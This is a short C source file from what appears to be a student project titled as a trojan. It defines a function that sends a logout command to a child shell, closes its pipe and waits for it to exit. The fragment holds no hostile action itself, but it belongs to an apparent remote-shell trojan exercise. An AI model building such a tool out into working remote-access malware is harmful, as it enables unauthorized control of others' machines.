/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 shell_stop.c
*/

#include "client.h"
#include <sys/wait.h>

void shell_stop(shell_t *shell)
{
    if (shell->pid != -1) {
        send_shell_command(shell, LOGOUT_CMD);
        close(shell->pipe[1]);
        write_in_log(1, "shell_stop: Wait shell to stop\n");
        waitpid(shell->pid, NULL, 0);
        write_in_log(1, "shell_stop: Shell stopped\n");
        shell->pid = -1;
    } else {
        write_in_log(1, "shell_stop: shell not started\n");
    }
}
